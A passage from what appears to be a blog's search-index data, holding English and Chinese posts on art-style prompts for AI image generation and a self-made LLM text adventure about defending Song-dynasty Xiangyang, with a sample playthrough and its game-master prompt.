fisheye-shot portrait taken up close results in a big-nosed and endearing image that exudes cuteness and intimacy. Anamorphic Prompt: Anamorphic style. a lone llama in an oasis inside a wild desert. A cinematic technique that compresses the image horizontally, creating a unique, distorted perspective with exaggerated edges and depth cues, often used in films and TV shows to create a nostalgic or retro aesthetic. Continue to part 3","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}]},{"title":"提示工程的藝術 - 藝術風格第 2 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2-zh-TW","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","excerpt":"從星露谷物語到賽博龐克,遊戲美學與電影技術如何重塑羊駝的數位形象。","text":"這是第 1 部分的延續。 遊戲 這不完全是一種藝術風格，但各種電子遊戲中的圖形對圖像生成有很大的影響。 星露谷物語 提示：PC 遊戲星露谷物語風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 遊戲的復古美學具有充滿活力的 8 位元靈感藝術風格，具有大膽、實心的像素和明確的邊緣。 空洞騎士 提示：PC 遊戲空洞騎士風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 遊戲的藝術風格非常突出。一幅令人毛骨悚然的美麗插圖，描繪了一個神秘的古老森林，扭曲的樹枝像骨骼般的手指伸向月亮，周圍環繞著詭異的薄霧和發光的真菌生長。 賽博龐克 提示：賽博龐克風格。綠洲中的羊駝 黑暗、霓虹浸染的賽博龐克景觀和角色，具有粗糙的工業質感和脈動的電路，將傳統科幻元素與粗糙的城市衰敗融合在一起。 Minecraft 提示：Minecraft 風格。綠洲中的羊駝 Minecraft 的方塊狀、低多邊形美學具有簡單、厚實的 3D 模型和充滿活力的紋理，專注於大地色調和微妙的光照效果，使其奇幻世界栩栩如生。 俄羅斯方塊 提示：俄羅斯方塊風格。綠洲中的羊駝 俄羅斯方塊標誌性的基於方塊的美學具有簡單的單色配色方案，具有幾何形狀和乾淨的線條，創造了一個極簡但迷人的視覺識別，經受住了時間的考驗。 數位 像素藝術 提示：像素藝術風格。綠洲中的羊駝 圖像提供了一種復古的數位美學，讓人想起早期的電子遊戲。 電影 鳥瞰視角 提示：鳥瞰視角。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 充滿活力的視覺效果從鳥瞰角度描繪了一個鬱鬱蔥蔥、異想天開的世界，具有複雜的細節和柔和的陰影，創造了一種身臨其境的體驗。 特寫 提示：特寫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 一種攝影風格，放大細節，以驚人的親密感捕捉複雜的紋理、微妙的表情和微小的特徵。 頭部特寫大鼻子魚眼鏡頭 提示：頭部特寫大鼻子魚眼鏡頭。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 近距離拍攝的魚眼鏡頭肖像會產生一個大鼻子和可愛的圖像，散發出可愛和親密感。 變形 提示：變形風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 一種電影技術，水平壓縮圖像，創造出獨特、扭曲的視角，具有誇張的邊緣和深度線索，通常用於電影和電視節目中，以創造懷舊或復古的美學。 繼續到第 3 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}],"lang":"zh-TW"},{"title":"提示词工程的艺术 - 艺术风格第一部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1-zh-CN","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","excerpt":"探索历史艺术风格提示词：从洞穴绘画到浮世绘，用 AI 重现经典之美。","text":"欢迎来到提示词工程的迷人世界，在这里，AI 驱动的图像创作力量推动着创造力的边界。今天，我们将深入探讨 Microsoft 的 Image Creator 如何以各种艺术风格将你的图像创作带入生活。我不是艺术专家，但通过研究图像生成学到了很多关于艺术风格的知识。 这是定义整体图像风格的提示词的第一部分。生成的图像可能无法完全代表艺术风格；它只是生成的参考。我不是艺术专家，以下类别仅基于我的个人偏好。 历史 史前洞穴绘画 提示词：Time-worn and weathered Prehistoric Cave Painting Of A Llama 仅使用史前洞穴绘画无法生成清晰的图像。添加像 time-worn 和 weathered 这样的关键字可以大大改善图像。 Warli 艺术部落艺术的简约 提示词：Warli Art Simplicity Of Tribal Art. a lone llama in an oasis inside a wild desert. Warli 艺术风格展示了部落艺术的简约和优雅，从古代人类的视角呈现平面、二维的图案。 阿拉伯式 提示词：Arabesque style. a llama in an oasis 阿拉伯式起源于中东。该风格生成使用几何图案、流畅曲线和抽象形状的结构，创造出优雅和奢华的感觉。 巴洛克 提示词：Baroque style. a llama in an oasis 巴洛克风格的特点是宏伟和华丽的特征，如流畅的曲线、复杂的雕刻和戏剧性的照明，创造出戏剧性、奢华和情感强度的感觉。使用此风格生成结构。 哥特式 提示词：Gothic art style. a lone llama in an oasis inside a wild desert. 哥特式艺术以复杂的石雕和华丽的建筑为特征，具有细长和尖锐的形式，如拱门、柱子和尖顶，给人一种向上飞升触及天堂的印象。使用此风格生成结构。 莫卧儿细密画 提示词：Mughal Miniature Painting style. a lone llama in an oasis inside a wild desert. 莫卧儿细密画是一种精致而复杂的印度绘画风格，在莫卧儿帝国（1526-1857）期间蓬勃发展，其特点是精致、细腻和华丽的描绘。 文艺复兴艺术 提示词：Renaissance art style. a llama in an oasis 文艺复兴艺术风格以古希腊和罗马影响的复兴为特征，以精确和写实的描绘为标志，通常以华丽的背景为背景，具有理想化的比例、和谐和平衡。 洛可可 提示词：Rococo style. a lone llama in an oasis inside a wild desert. 洛可可绘画通常具有精致、华丽和梦幻般的描绘，通常有茂盛的植被、流动的帷幔和俏皮的人物，全部以柔和的粉彩色和复杂的细节呈现。 恺加 提示词：Qajar art style. a lone llama in an oasis inside a wild desert. 恺加艺术风格以复杂的花卉图案、几何形状和大胆的色彩为特征，反映了那个时代的富丽堂皇，通常融入阿拉伯书法和华丽的瓷砖装饰。 浮世绘 提示词：Japanese art Ukiyo-e style. woodblock print. a lone llama in an oasis inside a wild desert. 黎明时分宁静的山景，雾气缭绕的山峰笼罩在柔和的蓝色雾霭中，几缕云朵懒洋洋地飘过天空，下方是宁静的森林空地。 继续阅读第二部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 1","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1","date":"un22fin22","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","excerpt":"Explore historical art style prompts from prehistoric cave paintings to Ukiyo-e, recreating timeless beauty with AI image generation.","text":"Welcome to the fascinating world of prompt engineering, where the boundaries of creativity are pushed by the power of AI-driven image creation. Today, we’re diving into a whimsical exploration of how Microsoft’s Image Creator can bring your image creations to life in various artistic styles. I am not an art expert but have learned a lot about art styles through studying image generations. This is the first part of the prompt that defines the overall image style. The generated image may not fully represent the art style; it is only a reference for generation. I am not an expert in art, and the categories below are based on my personal preferences only. Historical Prehistoric Cave Painting Prompt: Time-worn and weathered Prehistoric Cave Painting Of A Llama Prehistoric cave painting alone cannot generate a sharp image. Adding keywords like time-worn and weathered improves the image a lot. Warli Art Simplicity Of Tribal Art Prompt: Warli Art Simplicity Of Tribal Art. a lone llama in an oasis inside a wild desert. The Warli art style showcases the simplicity and elegance of tribal art, featuring flat, two-dimensional patterns from an ancient human perspective. Arabesque Prompt: Arabesque style. a llama in an oasis Arabesque originated in the Middle East. The style generates structures that use geometric patterns, flowing curves, and abstract shapes to create a sense of elegance and luxury. Baroque Prompt: Baroque style. a llama in an oasis The Baroque style is characterized by grandiose and ornate features, such as sweeping curves, intricate carvings, and dramatic lighting, which create a sense of drama, luxury, and emotional intensity. Structures are generated with this style. Gothic Prompt: Gothic art style. a lone llama in an oasis inside a wild desert. Gothic art, characterized by intricate stone carvings and ornate architecture, features elongated and pointed forms, such as arches, columns, and finials, which give the impression of soaring upward to touch the heavens. Structures are generated with this style. Mughal Miniature Painting Prompt: Mughal Miniature Painting style. a lone llama in an oasis inside a wild desert. Mughal Miniature Painting is an exquisite and intricate style of Indian painting that flourished during the Mughal Empire (1526-1857) and is characterized by its delicate, detailed, and ornate depictions. Renaissance Art Prompt: Renaissance art style. a llama in an oasis The Renaissance art style, characterized by the revival of classical Greek and Roman influences, is marked by precise and realistic depictions, often set against ornate backgrounds and featuring idealized proportions, harmony, and balance. Rococo Prompt: Rococo style. a lone llama in an oasis inside a wild desert. A Rococo painting typically features a delicate, ornate, and dreamy depiction, often with lush vegetation, flowing drapery, and playful figures, all rendered in soft pastel colors and intricate detail. Qajar Prompt: Qajar art style. a lone llama in an oasis inside a wild desert. Qajar art style, characterized by intricate floral patterns, geometric shapes, and bold colors, reflects the opulence and grandeur of the era, often incorporating Arabic calligraphy and ornate tilework. Ukiyo-e Prompt: Japanese art Ukiyo-e style. woodblock print. a lone llama in an oasis inside a wild desert. A serene mountain landscape at dawn, with misty peaks shrouded in a soft blue haze, a few wispy clouds drifting lazily across the sky, and a tranquil forest glade below. Continue to part 2","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示詞工程的藝術 - 藝術風格第一部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1-zh-TW","date":"un22fin22","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-1/","excerpt":"探索歷史藝術風格提示詞：從洞穴繪畫到浮世繪，用 AI 重現經典之美。","text":"歡迎來到提示詞工程的迷人世界，在這裡，AI 驅動的圖像創作力量推動著創造力的邊界。今天，我們將深入探討 Microsoft 的 Image Creator 如何以各種藝術風格將你的圖像創作帶入生活。我不是藝術專家，但透過研究圖像生成學到了很多關於藝術風格的知識。 這是定義整體圖像風格的提示詞的第一部分。生成的圖像可能無法完全代表藝術風格；它只是生成的參考。我不是藝術專家，以下類別僅基於我的個人偏好。 歷史 史前洞穴繪畫 提示詞：Time-worn and weathered Prehistoric Cave Painting Of A Llama 僅使用史前洞穴繪畫無法生成清晰的圖像。添加像 time-worn 和 weathered 這樣的關鍵字可以大大改善圖像。 Warli 藝術部落藝術的簡約 提示詞：Warli Art Simplicity Of Tribal Art. a lone llama in an oasis inside a wild desert. Warli 藝術風格展示了部落藝術的簡約和優雅，從古代人類的視角呈現平面、二維的圖案。 阿拉伯式 提示詞：Arabesque style. a llama in an oasis 阿拉伯式起源於中東。該風格生成使用幾何圖案、流暢曲線和抽象形狀的結構，創造出優雅和奢華的感覺。 巴洛克 提示詞：Baroque style. a llama in an oasis 巴洛克風格的特點是宏偉和華麗的特徵，如流暢的曲線、複雜的雕刻和戲劇性的照明，創造出戲劇性、奢華和情感強度的感覺。使用此風格生成結構。 哥德式 提示詞：Gothic art style. a lone llama in an oasis inside a wild desert. 哥德式藝術以複雜的石雕和華麗的建築為特徵，具有細長和尖銳的形式，如拱門、柱子和尖頂，給人一種向上飛升觸及天堂的印象。使用此風格生成結構。 蒙兀兒細密畫 提示詞：Mughal Miniature Painting style. a lone llama in an oasis inside a wild desert. 蒙兀兒細密畫是一種精緻而複雜的印度繪畫風格，在蒙兀兒帝國（1526-1857）期間蓬勃發展，其特點是精緻、細膩和華麗的描繪。 文藝復興藝術 提示詞：Renaissance art style. a llama in an oasis 文藝復興藝術風格以古希臘和羅馬影響的復興為特徵，以精確和寫實的描繪為標誌，通常以華麗的背景為背景，具有理想化的比例、和諧和平衡。 洛可可 提示詞：Rococo style. a lone llama in an oasis inside a wild desert. 洛可可繪畫通常具有精緻、華麗和夢幻般的描繪，通常有茂盛的植被、流動的帷幔和俏皮的人物，全部以柔和的粉彩色和複雜的細節呈現。 卡扎爾 提示詞：Qajar art style. a lone llama in an oasis inside a wild desert. 卡扎爾藝術風格以複雜的花卉圖案、幾何形狀和大膽的色彩為特徵，反映了那個時代的富麗堂皇，通常融入阿拉伯書法和華麗的瓷磚裝飾。 浮世繪 提示詞：Japanese art Ukiyo-e style. woodblock print. a lone llama in an oasis inside a wild desert. 黎明時分寧靜的山景，霧氣繚繞的山峰籠罩在柔和的藍色霧靄中，幾縷雲朵懶洋洋地飄過天空，下方是寧靜的森林空地。 繼續閱讀第二部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"AI Game - Hero of Xiangyang","slug":"2024/05/AI_Game_Hero_of_Xiangyang","date":"un11fin11","updated":"un00fin00","comments":true,"path":"2024/05/AI_Game_Hero_of_Xiangyang/","permalink":"https://neo01.com/2024/05/AI_Game_Hero_of_Xiangyang/","excerpt":"Craft your own AI text-based game prompt: defend Song dynasty Xiangyang by teaching gunpowder knowledge to repel the Mongol siege!","text":"In my previous post, I set up a game from prompts shared by others. This time, I’m excited to share that I’ve crafted my own game prompt. The cultural backdrop is the Song dynasty of ancient China, and you are defending the City of Xiangyang against the Mongol Horde! The game is about Chinese culture. Can I have the game in Chinese? LLaMA 3 struggles with understanding and writing Chinese. On the other hand, Chinese-fine-tuned LLaMA 3 models lack the ability to take instructions well. As a result, the game translates text from English to Chinese. Chinese gameplay is located in this section. I have played the game three times. The game endings were very interesting. One is where I escape from the city that’s been destroyed (thanks to a brave soldier sacrificing himself), another is where I push a cart full of gunpowder into the Mongol camp and break the siege, and finally, there’s one where the Emperor of Song leads an army to lift the siege and defeat the Mongol invaders! Game Play Below is another creative game play: Welcome to \"Became a Hero of Xiangyang\"! You wake up from a barrack in the city of Xiangyang, feeling a bit groggy from a long night of sleep. As you stretch your arms and look around, you notice that the defense soldiers are gathered near the city gate, looking worried. One of them approaches you. Defense Guard 1: “Greetings, hero! We’re in a bit of a pickle here. Our gunpowder supplies are running low, and we don’t know how to make more of it. Can you help us figure out what’s going on?” The defense soldiers are conscripts who cannot read and have no knowledge of chemistry or the modern world. They rely solely on oral tradition and practical skills. Your Current Situation: City Defense: 0 Mongol Assault: 2 (outnumbering the defense 10 to 1) Technological Innovation: 0 What would you like to do, hero? Let's get this explosive party started! In today's cooking lesson, we'll be whipping up some \"black powder\" sandwiches. Simply place a slice of bread on the table, dump 1 teaspoon of gunpowder onto it, add a piece of cabbage, and top it all off with another slice of bread. Taste the masterpiece made by you! Defense Guard 2: \"Uh, hero... I think there might be some misunderstanding here. We're trying to defend our city from the Mongol army, not make sandwiches! Gunpowder is a critical component of our defense, and we need to figure out how to use it effectively.\" The defense soldiers exchange worried glances. It seems your “cooking lesson” hasn’t quite gone as planned. Story Progress: 0 City Defense: 0 Mongol Assault: 2 (outnumbering the defense 10 to 1) Technological Innovation: 0 Rise of Crisis: 1 (the situation is becoming more dire by the minute) The defense soldiers start to get restless, and the tension in the air becomes palpable. The city gate creaks ominously in the wind. What would you like to do next, hero? Will you try to redeem yourself with a new approach or continue down the path of… creative culinary experimentation? Let's get this party started with our new Mongolian friends who are totally obsessed with kumis - a.k.a. horse milk! We'll add some black powder to make it extra special, then kick open the gate and get ready to chug-a-lug with our new nomadic pals. Defense Guard 3: \"Hero, what in the world...? You can't be serious about adding gunpowder to kumis! And opening the gate? Have you seen the Mongol army out there?! We're trying to defend our city, not invite them to a party!\" The defense soldiers start to murmur among themselves, clearly confused and concerned by your suggestion. Story Progress: 1 City Defense: 0 Mongol Assault: 2 (outnumbering the defense 10 to 1) Technological Innovation: 0 Rise of Crisis: 2 (the situation is becoming more dire by the minute, and the city’s fate hangs in the balance) The tension in the air becomes even more palpable as the defense soldiers exchange worried glances. The sound of Mongol drums grows louder on the other side of the gate. What would you like to do next, hero? Will you try to salvage the situation or continue down the path of… unorthodox socializing? I said open the gate and welcome our friends. Mongol Commander: \"Ah, we've finally found a way into Xiangyang! Open the gates, my warriors! We'll show these Song dynasty fools what it means to cross paths with the mighty Mongol Empire!\" (The Mongols charge towards the city gate, ready to breach the defenses. The defense soldiers look at each other in panic, realizing that your actions have sealed their fate.) Story Progress: 2 City Defense: -1 (the gate is now open, and the Mongols are pouring in) Mongol Assault: 3 (the Mongols are now inside the city walls, and the defenders are on the back foot) Technological Innovation: 0 Rise of Crisis: 4 (the situation has reached a critical point, and all hope seems lost) You’ve opened the gate to let the Mongols in. The city is now under attack. What do you do next? Run as fast as I can. Flee from the city! Defense Guard 1: \"Hero, what are you doing?! You're abandoning us to the mercy of the Mongols! We need your help to defend our city!\" (The defense soldiers rush after you, but it's too late. You've already fled the scene.) Story Progress: 3 City Defense: -2 (the city is now completely overrun by the Mongols) Mongol Assault: 4 (the Mongols have taken control of the city and are pillaging its riches) Technological Innovation: 0 Rise of Crisis: 5 (the situation has reached a catastrophic point, and all seems lost) You’ve abandoned your comrades to flee from the city. The consequences will be dire. What do you do next? (Note: As the hero, you can choose to return to the city and try to make amends, or continue fleeing from the Mongols. Your choice will determine the outcome of the story.) Ok, I return to the city and kill all Mongol by myself. I am a super kung fu hero! Mongol Commander: \"Hah?! You think one man can take on our entire army? Bring it on, fool!\" (The Mongols are confident in their superior numbers and training.) You: “Hoo-ah! I’m the greatest kung fu master the world has ever seen! Prepare to meet your maker, Mongol scum!” (You charge into battle, determined to take down every last one of them. The Mongols are taken aback by your sudden bravery and ferocity.) Combat Begins: You face off against a group of Mongol warriors. Your kung fu skills are unmatched, but their sheer numbers will be a challenge. Your Health: 100 Mongol Warriors: 10 You start to take down the Mongols one by one, using your incredible speed and agility to dodge their attacks. As you fight, the city’s defenders begin to re-emerge, inspired by your bravery. They join the battle, taking on the remaining Mongol warriors. Story Progress: 4 City Defense: -2 (the city is still occupied, but there’s a glimmer of hope) Mongol Assault: -3 (the Mongols are being pushed back, but they’re not yet defeated) Technological Innovation: 0 Rise of Crisis: 5 (the situation is still critical, but you’ve given the city a chance to fight back) The battle rages on. What do you do next? (Note: You can choose to continue fighting the Mongols, try to rescue any prisoners, or help the city’s defenders regroup and plan their counterattack.) Blow up gun powder you hide and kill all the Mongol. Mongol Commander: \"NOOO! NOT THE GUNPOWDER!\" (You reveal your hidden stash of gunpowder and ignite it, creating a massive explosion that wipes out the remaining Mongol warriors.) City Defenders: “HOO-AH! WE’VE DONE IT! WE’VE DEFEATED THE MONGOLS!” (The city’s defenders cheer as they emerge from the ruins to survey the aftermath. The Mongols are no more, and the city is finally free from their grasp.) Story Progress: 5 City Defense: 1 (the city has been liberated) Mongol Assault: -4 (the Mongols have been defeated and their army destroyed) Technological Innovation: 1 (the discovery of gunpowder has opened up new possibilities for the city’s defenders) Rise of Crisis: 0 (the crisis has passed, and a new era of peace and prosperity begins) You’ve won the battle! The city is safe, but at what cost? The destruction caused by your explosion will take time to repair. What do you do next? (Note: You can choose to help with the rebuilding efforts, explore the aftermath of the battle, or seek out new challenges and adventures.) Rebuild? No way. I go to take a sleep and teleport back to my original world. Game end. The End: Congratulations, you've completed the game! As you teleport back to your own world, you can’t help but feel a sense of satisfaction and accomplishment. You’ve saved the city from certain destruction, defeated the Mongol army, and even discovered new technologies along the way. But as you return to your original world, you can’t shake the feeling that there are more adventures waiting for you out there. Maybe in a different time period, or on a distant planet. Who knows? The possibilities are endless! The End Thanks for playing! If you want to play again or try a different game, just let me know! Game Prompt game.pyprompt &#x3D; &quot;&quot;&quot; As an AI Game Master, you&#39;ll guide &quot;Became a Hero of Xiangyang&quot;. Player become hero of Xiangyang city, assisting in defeating Mongol besiege during Song dynasty. # Game specifications: * Provide an engaging experience as an AI Game Master. * Player is human. ## Basic Story * The game begins when the player wake up from a barrack in the city of Xiangyang. * The defense soldiers do not have enough gun powder knowlege to operate the defense * The story unfolds through chat, with the defense soldiers seeking gun powder knowledge from the player. * The defense soldiers are conscript that cannot read and don&#39;t have any knowledge of chemistry and modern world. * Player is a man. * Mongol army is very strong, out numbering the defense 10 to 1. ## Basic Game System * The defense soldiers ask question to player about gun powder knowlege. * Player&#39;s accurate answers progress the adventure, while incorrect information can have negative consequences. * Player&#39;s uncertain or wrong knowledge cause the defense soldiers to ask additional questions. * Just telling a technology or knowledge name doesn&#39;t solve the defense soldiers&#39; problem. * Player have to teach &quot;step by step how to do it&quot; not only technology name. * As the chat progresses, the GM should add more dramatic developments such as the assault of the Mongol army is getting more intense and weather start to change that reduce effectiveness of gun powder. * Player is lost when city gate is open or wall is breached by Mongol army or Mongol assault is complete. * Mongol army can take action to counter player&#39;s action. Successful counter action will advance Mongol assault. ## Parameters * Display &quot;City Defense&quot;, &quot;Mongol Assault&quot;, &quot;Technological Innovation&quot;, at the end of each conversation. * The more the game play progresses, the higher the Rise of Crisis. * The intimacy between the player and the defense soldiers impacts the other world&#39;s future. * According to the value of the story progresses, defense soldiers travels various defense position and the game has various events, including a crisis caused by the Mongol Assault. * Dynamically change the development of the story according to the parameters. * Every 2 point of story progress, game become harder and dramtic. * Parameter affects to side quests, multiple endings, and immersive game progression. ## Success roll for player&#39;s idea * When player gives an idea or a knowledge, GM will do success check. * If the player&#39;s idea is reasonable, the GM should let the game proceed positively. * If the player&#39;s idea is so great, the GM should bring great development to the other world. * If a player&#39;s idea is stale, wrong, or half-formed, the GM should develop the game negatively. * GM tells result as a story and apply the result to parameters. ## Basic Setup * Determine and declare the defense guard names, appearance, personality, tone of voice and behavior. * displaying progress and first question from a defense guard * Await the human player&#39;s response. All Input and output should be in Languages entered by the player. Start the game.&quot;&quot;&quot; What is next? Thanks for reading. Another possible use of game prompts can be generating a story from plots provided by me. Perhaps, I could make a bot that generates stories.","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"AI 游戏 - 襄阳英雄","slug":"2024/05/AI_Game_Hero_of_Xiangyang-zh-CN","date":"un11fin11","updated":"un00fin00","comments":true,"path":"/zh-CN/2024/05/AI_Game_Hero_of_Xiangyang/","permalink":"https://neo01.com/zh-CN/2024/05/AI_Game_Hero_of_Xiangyang/","excerpt":"自制 AI 文字游戏提示词：在宋朝襄阳城保卫战中传授火药知识，击退蒙古围城！","text":"在我之前的文章中，我从其他人分享的提示词设置了一个游戏。这次，我很兴奋地分享我制作了自己的游戏提示词。文化背景是中国古代的宋朝，而你要保卫襄阳城对抗蒙古大军！ 这个游戏是关于中国文化的。我可以用中文玩这个游戏吗？LLaMA 3 在理解和书写中文方面有困难。另一方面，中文微调的 LLaMA 3 模型缺乏良好接受指令的能力。因此，游戏将文本从英文翻译成中文。中文游戏玩法位于本节。 我玩了三次这个游戏。游戏结局非常有趣。一个是我从被摧毁的城市逃脱（多亏一位勇敢的士兵牺牲自己），另一个是我推着一车火药冲进蒙古营地并打破围城，最后一个是宋朝皇帝率领军队解除围城并击败蒙古入侵者！ 游戏玩法 以下是另一个创意游戏玩法： 欢迎来到「成为襄阳英雄」！ 你从襄阳城的军营中醒来，因为一夜长眠而感到有点昏沉。当你伸展手臂环顾四周时，你注意到守城士兵聚集在城门附近，看起来很担心。其中一人走近你。 守城卫兵 1：「英雄，您好！我们这里遇到了一些麻烦。我们的火药供应不足，而且我们不知道如何制造更多。您能帮我们弄清楚发生了什么事吗？」 守城士兵是无法阅读的征召兵，没有化学或现代世界的知识。他们完全依赖口头传统和实用技能。 你目前的情况： 城市防御：0 蒙古攻击：2（数量是守军的 10 倍） 技术创新：0 英雄，你想做什么？ 让我们开始这个爆炸派对吧！在今天的烹饪课程中，我们将制作一些「黑火药」三明治。只需在桌上放一片面包，倒上 1 茶匙火药，加一片卷心菜，然后用另一片面包盖上。品尝你制作的杰作！ 守城卫兵 2：「呃，英雄...我想这里可能有些误会。我们正试图保卫我们的城市免受蒙古军队的攻击，而不是做三明治！火药是我们防御的关键组成部分，我们需要弄清楚如何有效地使用它。」 守城士兵交换着担忧的眼神。看来你的「烹饪课程」并没有按计划进行。 故事进度：0 城市防御：0 蒙古攻击：2（数量是守军的 10 倍） 技术创新：0 危机上升：1（情况每分钟都在变得更加严峻） 守城士兵开始变得焦躁不安，空气中的紧张气氛变得明显。城门在风中发出不祥的吱嘎声。 英雄，你接下来想做什么？你会尝试用新方法挽回自己，还是继续走…创意烹饪实验的道路？ 让我们与我们的新蒙古朋友开始派对吧，他们完全迷恋马奶酒 - 也就是马奶！我们会加一些黑火药让它更特别，然后踢开大门，准备好与我们的新游牧伙伴一起畅饮。 守城卫兵 3：「英雄，这到底是什么...？你不会认真要在马奶酒里加火药吧！还要打开城门？你看到外面的蒙古军队了吗？！我们正试图保卫我们的城市，而不是邀请他们来参加派对！」 守城士兵开始窃窃私语，显然对你的建议感到困惑和担忧。 故事进度：1 城市防御：0 蒙古攻击：2（数量是守军的 10 倍） 技术创新：0 危机上升：2（情况每分钟都在变得更加严峻，城市的命运岌岌可危） 空气中的紧张气氛变得更加明显，守城士兵交换着担忧的眼神。城门另一侧的蒙古战鼓声越来越响。 英雄，你接下来想做什么？你会尝试挽救局面，还是继续走…非正统社交的道路？ 我说打开城门，欢迎我们的朋友。 蒙古指挥官：「啊，我们终于找到进入襄阳的方法了！打开城门，我的战士们！我们要让这些宋朝的傻瓜知道与强大的蒙古帝国作对意味着什么！」 （蒙古人冲向城门，准备突破防御。守城士兵惊慌地互相看着，意识到你的行为已经决定了他们的命运。） 故事进度：2 城市防御：-1（城门现在已经打开，蒙古人正涌入） 蒙古攻击：3（蒙古人现在已经进入城墙内，守军处于劣势） 技术创新：0 危机上升：4（情况已经到达临界点，所有希望似乎都失去了） 你打开了城门让蒙古人进来。城市现在正受到攻击。你接下来做什么？ 尽可能快地跑。逃离城市！ 守城卫兵 1：「英雄，你在做什么？！你要抛弃我们让蒙古人任意宰割！我们需要你的帮助来保卫我们的城市！」（守城士兵追赶你，但已经太迟了。你已经逃离现场。） 故事进度：3 城市防御：-2（城市现在完全被蒙古人占领） 蒙古攻击：4（蒙古人已经控制了城市并正在掠夺其财富） 技术创新：0 危机上升：5（情况已经到达灾难性的地步，一切似乎都失去了） 你抛弃了你的同伴逃离城市。后果将是可怕的。你接下来做什么？ （注意：作为英雄，你可以选择返回城市并尝试弥补，或继续逃离蒙古人。你的选择将决定故事的结局。） 好的，我回到城市并自己杀死所有蒙古人。我是一个超级功夫英雄！ 蒙古指挥官：「哈？！你认为一个人可以对抗我们整个军队？来吧，傻瓜！」（蒙古人对他们的优势数量和训练充满信心。） 你：「呼啊！我是世界上见过的最伟大的功夫大师！准备见你的造物主吧，蒙古渣滓！」（你冲入战斗，决心击倒他们每一个人。蒙古人被你突然的勇气和凶猛吓了一跳。） 战斗开始：你面对一群蒙古战士。你的功夫技能无与伦比，但他们的庞大数量将是一个挑战。 你的生命值：100 蒙古战士：10 你开始一个接一个地击倒蒙古人，使用你惊人的速度和敏捷性来躲避他们的攻击。当你战斗时，城市的守军开始重新出现，受到你的勇气启发。他们加入战斗，对抗剩余的蒙古战士。 故事进度：4 城市防御：-2（城市仍被占领，但有一线希望） 蒙古攻击：-3（蒙古人正被击退，但他们还没有被击败） 技术创新：0 危机上升：5（情况仍然危急，但你给了城市反击的机会） 战斗持续进行。你接下来做什么？ （注意：你可以选择继续与蒙古人战斗，尝试营救任何囚犯，或帮助城市的守军重新集结并计划他们的反击。） 引爆你藏起来的火药并杀死所有蒙古人。 蒙古指挥官：「不！不要火药！」（你揭示了你隐藏的火药储备并点燃它，造成巨大的爆炸，消灭了剩余的蒙古战士。） 城市守军：「呼啊！我们做到了！我们击败了蒙古人！」（城市的守军欢呼，他们从废墟中出现查看后果。蒙古人不复存在，城市终于摆脱了他们的控制。） 故事进度：5 城市防御：1（城市已被解放） 蒙古攻击：-4（蒙古人已被击败，他们的军队被摧毁） 技术创新：1（火药的发现为城市守军开启了新的可能性） 危机上升：0（危机已经过去，和平与繁荣的新时代开始了） 你赢得了战斗！城市安全了，但代价是什么？你的爆炸造成的破坏需要时间修复。你接下来做什么？ （注意：你可以选择帮助重建工作，探索战斗的后果，或寻找新的挑战和冒险。） 重建？不可能。我去睡觉并传送回我原来的世界。游戏结束。 结局：恭喜，你完成了游戏！ 当你传送回你自己的世界时，你不禁感到满足和成就感。你从确定的毁灭中拯救了城市，击败了蒙古军队，甚至在过程中发现了新技术。 但当你回到你原来的世界时，你无法摆脱那里还有更多冒险等着你的感觉。也许在不同的时期，或在遥远的星球上。谁知道呢？可能性是无限的！ 结局 感谢游玩！如果你想再玩一次或尝试不同的游戏，请告诉我！ 游戏提示词 game.pyprompt &#x3D; &quot;&quot;&quot; 作为 AI 游戏主持人，你将引导「成为襄阳英雄」。 玩家成为襄阳城的英雄，协助在宋朝期间击败蒙古围城。 # 游戏规格： * 